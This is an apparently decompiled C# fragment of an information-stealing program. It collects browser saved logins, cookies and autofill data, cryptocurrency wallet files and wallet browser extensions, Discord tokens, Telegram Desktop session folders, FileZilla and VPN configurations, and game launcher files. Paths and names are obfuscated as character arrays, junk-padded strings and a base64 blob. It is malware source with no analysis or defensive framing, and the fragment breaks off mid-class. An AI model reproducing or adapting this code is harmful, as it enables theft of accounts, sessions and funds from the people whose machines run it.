	public static void blvnzcwqe(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id2)
		{
			result.Id7.Id9 = FileSearcher.Search(settings.Id10);
		}
	}

	public static void aso0shq2(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id3)
		{
			result.Id7.Id7 = FileZilla.Scan();
		}
	}

	public static void sdkf9h234as(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id4)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.Id11);
			List<Entity5> list = FileScanning.Search(new AllWallets(), brEx);
			list.AddRange(ConfigReader.Read(settings.Id13));
			result.Id7.Id11 = list;
		}
	}

	public static void asdoiad0123(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id9)
		{
			result.Id7.Id16 = Discord.GetTokens()?.ToList();
		}
	}

	public static void asdaid9h24kasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id8)
		{
			result.Id7.Id10 = FileScanning.Search(new GameLauncher());
		}
	}

	public static void a9duh3zd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id7)
		{
			result.Id7.Id12 = NordApp.Find();
			result.Id7.Id13 = FileScanning.Search(new OpenVPN());
			result.Id7.Id14 = FileScanning.Search(new РrоtoнVРN());
		}
	}
}
public delegate void ParsSt(EndpointConnection connection, Entity2 settings, ref Entity7 result);
public abstract class IdentitySenderBase
{
	protected static ParsSt[] Actions { get; set; }

	protected static ParsSt[] PreStageActions { get; set; }

	public abstract bool Send(EndpointConnection connection, Entity2 settings, ref Entity7 result);
}
public static class SenderFactory
{
	public static IdentitySenderBase Create(int version = 1)
	{
		return version switch
		{
			1 => new PartsSender(), 
			2 => new FullInfoSender(), 
			_ => new PartsSender(), 
		};
	}
}
public static class ConfigReader
{
	public static List<Entity5> Read(IEnumerable<Entity17> configs)
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		List<Entity5> list = new List<Entity5>();
		try
		{
			foreach (Entity17 config in configs)
			{
				foreach (Entity16 item in config.Id3)
				{
					try
					{
						FileInfo[] files = new DirectoryInfo(Environment.ExpandEnvironmentVariables(config.Id2 + "\\" + item.Id1)).GetFiles(item.Id2, (SearchOption)(item.Id3 ? 1 : 0));
						foreach (FileInfo val in files)
						{
							try
							{
								list.Add(new Entity5(((FileSystemInfo)val).get_FullName())
								{
									Id4 = ((FileSystemInfo)val.get_Directory()).get_FullName().Replace(Environment.ExpandEnvironmentVariables(config.Id2) + "\\", string.Empty),
									Id5 = config.Id1
								});
							}
							catch (Exception)
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public static class FileScanning
{
	public static List<Entity5> Search(params FileScanner[] scanners)
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		List<Entity5> list = new List<Entity5>();
		try
		{
			foreach (FileScanner fileScanner in scanners)
			{
				try
				{
					foreach (Entity16 scanArg in fileScanner.GetScanArgs())
					{
						try
						{
							FileInfo[] files = new DirectoryInfo(scanArg.Id1).GetFiles(scanArg.Id2, (SearchOption)(scanArg.Id3 ? 1 : 0));
							foreach (FileInfo val in files)
							{
								try
								{
									list.Add(new Entity5(((FileSystemInfo)val).get_FullName())
									{
										Id4 = fileScanner.GetFolder(scanArg, val),
										Id5 = (string.IsNullOrWhiteSpace(fileScanner.Name) ? scanArg.Id5 : fileScanner.Name)
									});
								}
								catch (Exception)
								{
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		List<string> list = new List<string>();
		list.Add(new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }));
		list.Add(new string(new char[15]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', '\\'
		}));
		list.Add(new string(new char[21]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
			'\\'
		}));
		list.Add(new string(new char[14]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
			'a', 't', 'a', '\\'
		}));
		List<string> list2 = list;
		List<string> list3 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list3;
		}
		try
		{
			string[] directories = Directory.GetDirectories(baseDirectory);
			foreach (string text in directories)
			{
				bool flag = false;
				foreach (string item in list2)
				{
					if (text.Contains(item))
					{
						flag = true;
						break;
					}
				}
				if (flag)
				{
					continue;
				}
				try
				{
					DirectoryInfo val = new DirectoryInfo(text);
					FileInfo[] files2 = val.GetFiles();
					bool flag2 = false;
					for (int j = 0; j < files2.Length; j++)
					{
						if (flag2)
						{
							break;
						}
						for (int k = 0; k < files.Length; k++)
						{
							if (flag2)
							{
								break;
							}
							string obj = files[k];
							FileInfo val2 = files2[j];
							if (obj == ((FileSystemInfo)val2).get_Name())
							{
								flag2 = true;
								list3.Add(((FileSystemInfo)val2).get_FullName());
							}
						}
					}
					foreach (string item2 in FindPaths(((FileSystemInfo)val).get_FullName(), maxLevel, level + 1, files))
					{
						if (!list3.Contains(item2))
						{
							list3.Add(item2);
						}
					}
					val = null;
				}
				catch
				{
				}
			}
			return list3;
		}
		catch
		{
			return list3;
		}
	}
}
public static class FileSearcher
{
	public static List<Entity5> Search(IEnumerable<string> patterns)
	{
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Expected O, but got Unknown
		List<Entity5> list = new List<Entity5>();
		try
		{
			long num = 0L;
			foreach (string pattern in patterns)
			{
				if (num < 52428800)
				{
					try
					{
						string[] array = pattern.Split(new string[1]
						{
							new string(new char[1] { '|' })
						}, StringSplitOptions.RemoveEmptyEntries);
						if (array == null || array.Length <= 2)
						{
							continue;
						}
						string text = Environment.ExpandEnvironmentVariables(array[0]);
						string[] searchPatterns = array[1].Split(new string[1]
						{
							new string(new char[1] { ',' })
						}, StringSplitOptions.RemoveEmptyEntries);
						string value = array[2];
						long num2 = 3097152L;
						if (array.Length > 3)
						{
							num2 = Convert.ToInt64(array[3]);
						}
						if (text == new string(new char[8] { '%', 'D', 'S', 'K', '_', '2', '3', '%' }))
						{
							string[] logicalDrives = Environment.GetLogicalDrives();
							foreach (string rootPath in logicalDrives)
							{
								try
								{
									foreach (string file in GetFiles(rootPath, (SearchOption)Convert.ToInt32(value), searchPatterns))
									{
										try
										{
											FileInfo val = new FileInfo(file);
											if (val.get_Length() > 0 && val.get_Length() <= num2 && num < 52428800)
											{
												string[] array2 = ((FileSystemInfo)val.get_Directory()).get_FullName().Split(new string[1]
												{
													new string(new char[2] { ':', '\\' })
												}, StringSplitOptions.RemoveEmptyEntries);
												list.Add(new Entity5(((FileSystemInfo)val).get_FullName())
												{
													Id4 = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
													Id2 = file
												});
												num += val.get_Length();
											}
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
							continue;
						}
						foreach (string file2 in GetFiles(text, (SearchOption)Convert.ToInt32(value), searchPatterns))
						{
							try
							{
								FileInfo val2 = new FileInfo(file2);
								if (val2.get_Length() > 0 && val2.get_Length() <= num2 && num < 52428800)
								{
									string[] array3 = ((FileSystemInfo)val2.get_Directory()).get_FullName().Split(new string[1]
									{
										new string(new char[2] { ':', '\\' })
									}, StringSplitOptions.RemoveEmptyEntries);
									list.Add(new Entity5(((FileSystemInfo)val2).get_FullName())
									{
										Id4 = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
										Id2 = file2
									});
									num += val2.get_Length();
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
					continue;
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static IEnumerable<string> GetFiles(string rootPath, SearchOption searchOption, string[] searchPatterns)
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Invalid comparison between Unknown and I4
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		List<string> list = new List<string>();
		list.Add(new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }));
		list.Add(new string(new char[15]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', '\\'
		}));
		list.Add(new string(new char[21]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
			'\\'
		}));
		list.Add(new string(new char[14]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
			'a', 't', 'a', '\\'
		}));
		List<string> list2 = list;
		IEnumerable<string> enumerable = Enumerable.Empty<string>();
		if ((int)searchOption == 1)
		{
			try
			{
				foreach (string item in Directory.EnumerateDirectories(rootPath))
				{
					if (list2 != null && list2.Any())
					{
						bool flag = false;
						foreach (string item2 in list2)
						{
							if (item.Contains(item2))
							{
								flag = true;
								break;
							}
						}
						if (flag)
						{
							continue;
						}
					}
					enumerable = enumerable.Concat(GetFiles(item, searchOption, searchPatterns));
				}
			}
			catch
			{
			}
		}
		foreach (string text in searchPatterns)
		{
			try
			{
				enumerable = enumerable.Concat(Directory.GetFiles(rootPath, text));
			}
			catch
			{
			}
		}
		return enumerable;
	}
}
public class AllWallets : FileScanner
{
	public override string GetFolder(Entity16 scannerArg, FileInfo filePath)
	{
		return ((FileSystemInfo)filePath.get_Directory()).get_FullName().Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty);
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		List<Entity16> list = new List<Entity16>();
		try
		{
			List<string> list2 = new List<string>();
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 2, 1, new string(new char[19]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
				'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
			}).Replace("asf", string.Empty), new string(new char[12]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
				's', 'f'
			}).Replace("asf", string.Empty)));
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 2, 1, new string(new char[19]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
				'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
			}).Replace("asf", string.Empty), new string(new char[12]
			{
				'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
				's', 'f'
			}).Replace("asf", string.Empty)));
			try
			{
				foreach (string item in list2)
				{
					string id = ((FileSystemInfo)new FileInfo(item).get_Directory()).get_FullName().Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty)
						.Split(new char[1] { '\\' })[0];
					list.Add(new Entity16
					{
						Id5 = id,
						Id1 = ((FileSystemInfo)new FileInfo(item).get_Directory()).get_FullName(),
						Id2 = "*wallet*",
						Id3 = false
					});
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch
		{
			return list;
		}
	}
}
public class BrEx : FileScanner
{
	private List<string> Locals;

	private IEnumerable<KeyValuePair<string, string>> PathsCollection;

	public void Init(IList<string> browserPaths)
	{
		Locals = new List<string>(browserPaths ?? new List<string>());
		PathsCollection = from x in Encoding.UTF8.GetString(Convert.FromBase64String(new string(new char[1420]
			{
				'Z', 'm', 'Z', 'u', 'Y', 'm', 'V', 's', 'Z', 'm',
				'R', 'v', 'Z', 'W', 'l', 'v', 'a', 'G', 'V', 'u',
				'a', '2', 'p', 'p', 'Y', 'm', '5', 't', 'Y', 'W',
				'R', 'q', 'a', 'W', 'V', 'o', 'a', 'm', 'h', 'h',
				'a', 'm', 'J', '8', 'W', 'W', '9', 'y', 'b', '2',
				'l', 'X', 'Y', 'W', 'x', 's', 'Z', 'X', 'Q', 'K',
				'a', 'W', 'J', 'u', 'Z', 'W', 'p', 'k', 'Z', 'm',
				'p', 't', 'b', 'W', 't', 'w', 'Y', '2', '5', 's',
				'c', 'G', 'V', 'i', 'a', '2', 'x', 't', 'b', 'm',
				't', 'v', 'Z', 'W', '9', 'p', 'a', 'G', '9', 'm',
				'Z', 'W', 'N', '8', 'V', 'H', 'J', 'v', 'b', 'm',
				'x', 'p', 'b', 'm', 's', 'K', 'a', 'm', 'J', 'k',
				'Y', 'W', '9', 'j', 'b', 'm', 'V', 'p', 'a', 'W',
				'l', 'u', 'b', 'W', 'p', 'i', 'a', 'm', 'x', 'n',
				'Y', 'W', 'x', 'o', 'Y', '2', 'V', 's', 'Z', '2',
				'J', 'l', 'a', 'm', '1', 'u', 'a', 'W', 'R', '8',
				'T', 'm', 'l', 'm', 'd', 'H', 'l', 'X', 'Y', 'W',
				'x', 's', 'Z', 'X', 'Q', 'K', 'b', 'm', 't', 'i',
				'a', 'W', 'h', 'm', 'Y', 'm', 'V', 'v', 'Z', '2',
				'F', 'l', 'Y', 'W', '9', 'l', 'a', 'G', 'x', 'l',
				'Z', 'm', '5', 'r', 'b', '2', 'R', 'i', 'Z', 'W',
				'Z', 'n', 'c', 'G', 'd', 'r', 'b', 'm', '5', '8',
				'T', 'W', 'V', '0', 'Y', 'W', '1', 'h', 'c', '2',
				's', 'K', 'Y', 'W', 'Z', 'i', 'Y', '2', 'J', 'q',
				'c', 'G', 'J', 'w', 'Z', 'm', 'F', 'k', 'b', 'G',
				't', 't', 'a', 'G', '1', 'j', 'b', 'G', 'h', 'r',
				'Z', 'W', 'V', 'v', 'Z', 'G', '1', 'h', 'b', 'W',
				'N', 'm', 'b', 'G', 'N', '8', 'T', 'W', 'F', '0',
				'a', 'F', 'd', 'h', 'b', 'G', 'x', 'l', 'd', 'A',
				'p', 'o', 'b', 'm', 'Z', 'h', 'b', 'm', 't', 'u',
				'b', '2', 'N', 'm', 'Z', 'W', '9', 'm', 'Y', 'm',
				'R', 'k', 'Z', '2', 'N', 'p', 'a', 'm', '5', 't',
				'a', 'G', '5', 'm', 'b', 'm', 't', 'k', 'b', 'm',
				'F', 'h', 'Z', 'H', 'x', 'D', 'b', '2', 'l', 'u',
				'Y', 'm', 'F', 'z', 'Z', 'Q', 'p', 'm', 'a', 'G',
				'J', 'v', 'a', 'G', 'l', 't', 'Y', 'W', 'V', 's',
				'Y', 'm', '9', 'o', 'c', 'G', 'p', 'i', 'Y', 'm',
				'x', 'k', 'Y', '2', '5', 'n', 'Y', '2', '5', 'h',
				'c', 'G', '5', 'k', 'b', '2', 'R', 'q', 'c', 'H',
				'x', 'C', 'a', 'W', '5', 'h', 'b', 'm', 'N', 'l',
				'Q', '2', 'h', 'h', 'a', 'W', '4', 'K', 'b', '2',
				'R', 'i', 'Z', 'n', 'B', 'l', 'Z', 'W', 'l', 'o',
				'Z', 'G', 't', 'i', 'a', 'W', 'h', 't', 'b', '3',
				'B', 'r', 'Y', 'm', 'p', 't', 'b', '2', '9', 'u',
				'Z', 'm', 'F', 'u', 'b', 'G', 'J', 'm', 'Y', '2',
				'x', '8', 'Q', 'n', 'J', 'h', 'd', 'm', 'V', 'X',
				'Y', 'W', 'x', 's', 'Z', 'X', 'Q', 'K', 'a', 'H',
				'B', 'n', 'b', 'G', 'Z', 'o', 'Z', '2', 'Z', 'u',
				'a', 'G', 'J', 'n', 'c', 'G', 'p', 'k', 'Z', 'W',
				'5', 'q', 'Z', '2', '1', 'k', 'Z', '2', '9', 'l',
				'a', 'W', 'F', 'w', 'c', 'G', 'F', 'm', 'b', 'G',
				'5', '8', 'R', '3', 'V', 'h', 'c', 'm', 'R', 'h',
				'V', '2', 'F', 's', 'b', 'G', 'V', '0', 'C', 'm',
				'J', 's', 'b', 'm', 'l', 'l', 'a', 'W', 'l', 'm',
				'Z', 'm', 'J', 'v', 'a', 'W', 'x', 's', 'a', '2',
				'5', 'q', 'b', 'm', 'V', 'w', 'b', '2', 'd', 'q',
				'a', 'G', 't', 'n', 'b', 'm', '9', 'h', 'c', 'G',
				'F', 'j', 'f', 'E', 'V', 'x', 'd', 'W', 'F', 's',
				'V', '2', 'F', 's', 'b', 'G', 'V', '0', 'C', 'm',
				'N', 'q', 'Z', 'W', 'x', 'm', 'c', 'G', 'x', 'w',
				'b', 'G', 'V', 'i', 'Z', 'G', 'p', 'q', 'Z', 'W',
				'5', 's', 'b', 'H', 'B', 'q', 'Y', '2', 'J', 's',
				'b', 'W', 'p', 'r', 'Z', 'm', 'N', 'm', 'Z', 'm',
				'5', 'l', 'f', 'E', 'p', 'h', 'e', 'H', 'h', '4',
				'T', 'G', 'l', 'i', 'Z', 'X', 'J', '0', 'e', 'Q',
				'p', 'm', 'a', 'W', 'h', 'r', 'Y', 'W', 't', 'm',
				'b', '2', 'J', 'r', 'b', 'W', 't', 'q', 'b', '2',
				'p', 'w', 'Y', '2', 'h', 'w', 'Z', 'm', 'd', 'j',
				'b', 'W', 'h', 'm', 'a', 'm', '5', 't', 'b', 'm',
				'Z', 'w', 'a', 'X', 'x', 'C', 'a', 'X', 'R', 'B',
				'c', 'H', 'B', 'X', 'Y', 'W', 'x', 's', 'Z', 'X',
				'Q', 'K', 'a', '2', '5', 'j', 'Y', '2', 'h', 'k',
				'a', 'W', 'd', 'v', 'Y', 'm', 'd', 'o', 'Z', 'W',
				'5', 'i', 'Y', 'm', 'F', 'k', 'Z', 'G', '9', 'q',
				'a', 'm', '5', 'u', 'Y', 'W', '9', 'n', 'Z', 'n',
				'B', 'w', 'Z', 'm', 'p', '8', 'a', 'V', 'd', 'h',
				'b', 'G', 'x', 'l', 'd', 'A', 'p', 'h', 'b', 'W',
				't', 't', 'a', 'm', 'p', 't', 'b', 'W', 'Z', 's',
				'Z', 'G', 'R', 'v', 'Z', '2', '1', 'o', 'c', 'G',
				'p', 's', 'b', '2', 'l', 't', 'a', 'X', 'B', 'i',
				'b', '2', 'Z', 'u', 'Z', 'm', 'p', 'p', 'a', 'H',
				'x', 'X', 'b', '2', '1', 'i', 'Y', 'X', 'Q', 'K',
				'Z', 'm', 'h', 'p', 'b', 'G', 'F', 'o', 'Z', 'W',
				'l', 't', 'Z', '2', 'x', 'p', 'Z', '2', '5', 'k',
				'Z', 'G', 't', 'q', 'Z', '2', '9', 'm', 'a', '2',
				'N', 'i', 'Z', '2', 'V', 'r', 'a', 'G', 'V', 'u',
				'Y', 'm', 'h', '8', 'Q', 'X', 'R', 'v', 'b', 'W',
				'l', 'j', 'V', '2', 'F', 's', 'b', 'G', 'V', '0',
				'C', 'm', '5', 's', 'Y', 'm', '1', 'u', 'b', 'm',
				'l', 'q', 'Y', '2', '5', 's', 'Z', 'W', 'd', 'r',
				'a', 'm', 'p', 'w', 'Y', '2', 'Z', 'q', 'Y', '2',
				'x', 't', 'Y', '2', 'Z', 'n', 'Z', '2', 'Z', 'l',
				'Z', 'm', 'R', 't', 'f', 'E', '1', 'l', 'd', '0',
				'N', '4', 'C', 'm', '5', 'h', 'b', 'm', 'p', 't',
				'Z', 'G', 't', 'u', 'a', 'G', 't', 'p', 'b', 'm',
				'l', 'm', 'b', 'm', 't', 'n', 'Z', 'G', 'N', 'n',
				'Z', '2', 'N', 'm', 'b', 'm', 'h', 'k', 'Y', 'W',
				'F', 't', 'b', 'W', '1', 'q', 'f', 'E', 'd', '1',
				'a', 'W', 'x', 'k', 'V', '2', 'F', 's', 'b', 'G',
				'V', '0', 'C', 'm', '5', 'r', 'Z', 'G', 'R', 'n',
				'b', 'm', 'N', 'k', 'a', 'm', 'd', 'q', 'Z', 'm',
				'N', 'k', 'Z', 'G', 'F', 't', 'Z', 'm', 'd', 'j',
				'b', 'W', 'Z', 'u', 'b', 'G', 'h', 'j', 'Y', '2',
				'5', 'p', 'b', 'W', 'l', 'n', 'f', 'F', 'N', 'h',
				'd', 'H', 'V', 'y', 'b', 'l', 'd', 'h', 'b', 'G',
				'x', 'l', 'd', 'A', 'p', 'm', 'b', 'm', 'p', 'o',
				'b', 'W', 't', 'o', 'a', 'G', '1', 'r', 'Y', 'm',
				'p', 'r', 'a', '2', 'F', 'i', 'b', 'm', 'R', 'j',
				'b', 'm', '5', 'v', 'Z', '2', 'F', 'n', 'b', '2',
				'd', 'i', 'b', 'm', 'V', 'l', 'Y', '3', 'x', 'S',
				'b', '2', '5', 'p', 'b', 'l', 'd', 'h', 'b', 'G',
				'x', 'l', 'd', 'A', 'p', 'h', 'a', 'W', 'l', 'm',
				'Y', 'm', '5', 'i', 'Z', 'm', '9', 'i', 'c', 'G',
				'1', 'l', 'Z', 'W', 't', 'p', 'c', 'G', 'h', 'l',
				'Z', 'W', 'l', 'q', 'a', 'W', '1', 'k', 'c', 'G',
				'5', 's', 'c', 'G', 'd', 'w', 'c', 'H', 'x', 'U',
				'Z', 'X', 'J', 'y', 'Y', 'V', 'N', '0', 'Y', 'X',
				'R', 'p', 'b', '2', '4', 'K', 'Z', 'm', '5', 'u',
				'Z', 'W', 'd', 'w', 'a', 'G', 'x', 'v', 'Y', 'm',
				'p', 'k', 'c', 'G', 't', 'o', 'Z', 'W', 'N', 'h',
				'c', 'G', 't', 'p', 'a', 'm', 'p', 'k', 'a', '2',
				'd', 'j', 'a', 'm', 'h', 'r', 'a', 'W', 'J', '8',
				'S', 'G', 'F', 'y', 'b', 'W', '9', 'u', 'e', 'V',
				'd', 'h', 'b', 'G', 'x', 'l', 'd', 'A', 'p', 'h',
				'Z', 'W', 'F', 'j', 'a', 'G', 't', 'u', 'b', 'W',
				'V', 'm', 'c', 'G', 'h', 'l', 'c', 'G', 'N', 'j',
				'a', 'W', '9', 'u', 'Y', 'm', '9', 'v', 'a', 'G',
				'N', 'r', 'b', '2', '5', 'v', 'Z', 'W', 'V', 't',
				'Z', '3', 'x', 'D', 'b', '2', 'l', 'u', 'O', 'T',
				'h', 'X', 'Y', 'W', 'x', 's', 'Z', 'X', 'Q', 'K',
				'Y', '2', 'd', 'l', 'Z', 'W', '9', 'k', 'c', 'G',
				'Z', 'h', 'Z', '2', 'p', 'j', 'Z', 'W', 'V', 'm',
				'a', 'W', 'V', 'm', 'b', 'G', '1', 'k', 'Z', 'n',
				'B', 'o', 'c', 'G', 'x', 'r', 'Z', 'W', '5', 's',
				'Z', 'm', 't', '8', 'V', 'G', '9', 'u', 'Q', '3',
				'J', '5', 'c', '3', 'R', 'h', 'b', 'A', 'p', 'w',
				'Z', 'G', 'F', 'k', 'a', 'm', 't', 'm', 'a', '2',
				'd', 'j', 'Y', 'W', 'Z', 'n', 'Y', 'm', 'N', 'l',
				'a', 'W', '1', 'j', 'c', 'G', 'J', 'r', 'Y', 'W',
				'x', 'u', 'Z', 'm', '5', 'l', 'c', 'G', 'J', 'u',
				'a', '3', 'x', 'L', 'Y', 'X', 'J', 'k', 'a', 'W',
				'F', 'D', 'a', 'G', 'F', 'p', 'b', 'g', '=', '='
			}))).Split(new string[2]
			{
				"\n",
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries)
			select new KeyValuePair<string, string>(x.Split(new char[1] { '|' })[0], x.Split(new char[1] { '|' })[1]);
	}

	public override string GetFolder(Entity16 scannerArg, FileInfo filePath)
	{
		foreach (KeyValuePair<string, string> item in PathsCollection)
		{
			if (((FileSystemInfo)filePath.get_Directory()).get_FullName().Contains(item.Key))
			{
				return scannerArg.Id5;
			}
		}
		return new string(new char[16]
		{
			'U', 'n', 'k', 'n', 'o', 'w', 'n', 'E', 'x', 't',
			'e', 'n', 's', 'i', 'o', 'n'
		});
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		List<Entity16> list = new List<Entity16>();
		try
		{
			new List<string>();
			foreach (string item in Locals.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
			{
				foreach (string item2 in FileCopier.FindPaths(item, 1, 1, new string(new char[10] { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a' }), new string(new char[8] { 'W', 'e', 'b', ' ', 'D', 'a', 't', 'a' }), new string(new char[7] { 'C', 'o', 'o', 'k', 'i', 'e', 's' })))
				{
					try
					{
						string empty = string.Empty;
						string empty2 = string.Empty;
						empty = ((FileSystemInfo)new FileInfo(item2).get_Directory()).get_FullName();
						empty2 = ((!empty.Contains(new string(new char[15]
						{
							'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X', ' ', 'S',
							't', 'a', 'b', 'l', 'e'
						}))) ? (item2.Contains(new string(new char[16]
						{
							'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'R', 'o',
							'a', 'm', 'i', 'n', 'g', '\\'
						})) ? FileCopier.ChromeGetRoamingName(empty) : FileCopier.ChromeGetLocalName(empty)) : new string(new char[8] { 'O', 'p', 'e', 'r', 'a', ' ', 'G', 'X' }));
						if (string.IsNullOrEmpty(empty2))
						{
							continue;
						}
						empty2 = empty2[0].ToString().ToUpper() + empty2.Remove(0, 1);
						string text = FileCopier.ChromeGetName(empty);
						if (string.IsNullOrEmpty(text))
						{
							continue;
						}
						foreach (KeyValuePair<string, string> item3 in PathsCollection)
						{
							list.Add(new Entity16
							{
								Id2 = new string(new char[1] { '*' }),
								Id5 = empty2 + "_" + text + "_" + item3.Value,
								Id3 = false,
								Id1 = Path.Combine(empty, new string(new char[24]
								{
									'L', 'o', 'c', 'a', 'l', ' ', 'E', 'x', 't', 'e',
									'n', 's', 'i', 'o', 'n', ' ', 'S', 'e', 't', 't',
									'i', 'n', 'g', 's'
								}), item3.Key)
							});
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class DesktopMessanger : FileScanner
{
	public List<string> PassedPaths { get; set; } = new List<string>();


	public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
	{
		string result = new string(new char[15]
		{
			'P', 'r', 'o', 'f', 'i', 'l', 'e', '_', 'U', 'n',
			'k', 'n', 'o', 'w', 'n'
		});
		try
		{
			DirectoryInfo directory = fileInfo.get_Directory();
			string text = string.Empty;
			if (((FileSystemInfo)directory).get_Name() != new string(new char[5] { 't', 'd', 'a', 't', 'a' }))
			{
				text = ((FileSystemInfo)directory).get_FullName().Split(new string[1]
				{
					new string(new char[5] { 't', 'd', 'a', 't', 'a' })
				}, StringSplitOptions.RemoveEmptyEntries)[1];
			}
			return new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', '_' }) + scannerArg.Id5 + (string.IsNullOrWhiteSpace(text) ? "" : ("\\" + text));
		}
		catch
		{
			return result;
		}
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		List<Entity16> list = new List<Entity16>();
		try
		{
			int num = 1;
			foreach (string item in SystemInfoHelper.GetProcessesByName(new string(new char[3] { 'T', 'e', 'l' }), new string(new char[9] { 'e', 'g', 'r', 'a', 'm', '.', 'e', 'x', 'e' })))
			{
				try
				{
					list.Add(new Entity16
					{
						Id5 = num.ToString(),
						Id2 = new string(new char[1] { '*' }),
						Id1 = ((FileSystemInfo)new FileInfo(item).get_Directory()).get_FullName() + new string(new char[6] { '\\', 't', 'd', 'a', 't', 'a' }),
						Id3 = false
					});
					string[] directories = Directory.GetDirectories(((FileSystemInfo)new FileInfo(item).get_Directory()).get_FullName() + new string(new char[6] { '\\', 't', 'd', 'a', 't', 'a' }));
					foreach (string text in directories)
					{
						if (((FileSystemInfo)new DirectoryInfo(text)).get_Name().Length == 16)
						{
							list.Add(new Entity16
							{
								Id5 = num.ToString(),
								Id2 = new string(new char[1] { '*' }),
								Id1 = text,
								Id3 = false
							});
						}
					}
					num++;
				}
				catch (Exception)
				{
				}
			}
			if (list.Count == 0)
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[23]
				{
					'\\', 'T', 'e', 'l', 'e', 'g', 'r', 'a', 'm', ' ',
					'D', 'e', 's', 'k', 't', 'o', 'p', '\\', 't', 'd',
					'a', 't', 'a'
				});
				list.Add(new Entity16
				{
					Id5 = num.ToString(),
					Id2 = new string(new char[1] { '*' }),
					Id1 = text2,
					Id3 = false
				});
				string[] directories = Directory.GetDirectories(text2);
				foreach (string text3 in directories)
				{
					if (((FileSystemInfo)new DirectoryInfo(text3)).get_Name().Length == 16)
					{
						list.Add(new Entity16
						{
							Id5 = num.ToString(),
							Id2 = new string(new char[1] { '*' }),
							Id1 = text3,
							Id3 = false
						});
					}
				}
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class Discord : FileScanner
{
	public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
